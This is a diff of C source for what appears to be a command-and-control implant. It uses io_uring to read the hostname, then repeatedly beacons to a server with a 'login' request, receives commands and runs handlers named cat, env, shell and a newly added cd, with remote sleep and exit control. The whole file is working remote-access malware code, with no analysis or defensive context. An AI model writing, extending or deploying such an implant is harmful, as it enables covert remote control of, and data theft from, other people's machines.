@@ -11,8 +11,7 @@
 #include "agent_functions/function_header.h"
 
 // Constants
-#define QUEUE_DEPTH 16    // Max number of rings. Like threads kinda.
-#define BUFFER_SIZE 16384 // Buffer for receiving data
+#define QUEUE_DEPTH 2    // Small because I only need it for hostname
 
 unsigned int sleep_int = 10;
 
@@ -26,7 +25,7 @@ void sanitize_cmd(char *cmd) {
 #define TABLE_SIZE 20
 #define CMD_LEN 64
 
-typedef void (*func_ptr)(struct io_uring *ring, int sockfd, const char *uuid, const char *args);
+typedef void (*func_ptr)(request_t *req, int sockfd, const char *uuid, const char *args);
 
 typedef struct {
     char command[CMD_LEN];
@@ -51,6 +50,7 @@ check function[] = {
     {"cat", cmd_cat},
     {"env", cmd_env},
     {"shell", cmd_shell},
+    {"cd", cmd_cd},
     {"NULL", NULL}
 };
 
@@ -68,24 +68,24 @@ bool hash_insert() {
     return true;
 }
 
-void command_execute(struct io_uring *ring, int sockfd, const char *uuid, char *input) {
+void command_execute(request_t *req, int sockfd, const char *uuid, char *input) {
     sanitize_cmd(input);
     char **tmp = split(input, ' ', 1);
     char *args = tmp[1];
     char *command = tmp[0];
     if (strcmp(command, "sleep") == 0) {
         sleep_int = atoi(args);
-        send2serv(uuid, "Done", 6);
+        send2serv(req, uuid, "Done\n", 6);
     } else {
         char lookup_key[CMD_LEN];
         snprintf(lookup_key, sizeof(lookup_key), command);
         int index = hash(lookup_key);
         if (hash_table[index] != NULL && strcmp(hash_table[index]->command, lookup_key) == 0) {
-            hash_table[index]->func(ring, sockfd, uuid, args);
+            hash_table[index]->func(req, sockfd, uuid, args);
         } else {
             char msg[256];
             snprintf(msg, sizeof(msg), "Invalid command or Something went wrong! (%s %s) How did you do this??\n", command, args ? args : "NULL");
-            send2serv(uuid, msg, strlen(msg));
+            send2serv(req, uuid, msg, strlen(msg));
         }
     }
     free(tmp);
@@ -110,8 +110,6 @@ int main() {
     char *uuid = base64_encode((const unsigned char *)tmp_uuid, strlen(tmp_uuid));
 
     struct io_uring ring;
-    // struct io_uring_sqe *sqe;
-    // struct io_uring_cqe *cqe;
     hash_insert();
     // --- 2. Initialize io_uring ---
     // This sets up the shared memory rings between our app and the kernel.
@@ -122,39 +120,42 @@ int main() {
 
     char *hostname = read_file(&ring, "/proc/sys/kernel/hostname");
     sanitize_cmd(hostname);
+    io_uring_queue_exit(&ring);
 
     while (true) {
         request_t *req = calloc(1, sizeof(request_t));
-        int sockfd = connection(&ring, req);
 
-        if (sockfd < 0) {
+        if (connection(req) < 0) {
             sleep(sleep_int);
             continue;
         }
 
-        char *http_body = send_get(&ring, req, uuid, "login", hostname);
+        char *http_body = send_get(req, uuid, "login", hostname);
 
         if (strcmp(http_body, "exit") == 0) {
-            close(req->client_socket);
-            //io_uring_queue_exit(&ring);
-            free(req);
+            // close(req->client_socket);
+            // free(req);
+            cleanup_connection(req);
             free(uuid);
             free(hostname);
+            // io_uring_queue_exit(&ring);
             break;
         } else if (strcmp(http_body, "") == 0) {
-            close(req->client_socket);
-            free(req);
+            // close(req->client_socket);
+            cleanup_connection(req);
+            // free(req);
             sleep(sleep_int);
             continue;
         } else {
-            command_execute(&ring, req->client_socket, uuid, http_body);
+            command_execute(req, req->client_socket, uuid, http_body);
         }
 
-        close(req->client_socket);
-        free(req);
+        // close(req->client_socket);
+        // free(req);
+        cleanup_connection(req);
         sleep(sleep_int);
     }
 
-    io_uring_queue_exit(&ring);
-    return 0;
+    // io_uring_queue_exit(&ring);
+    _exit(0);
 }
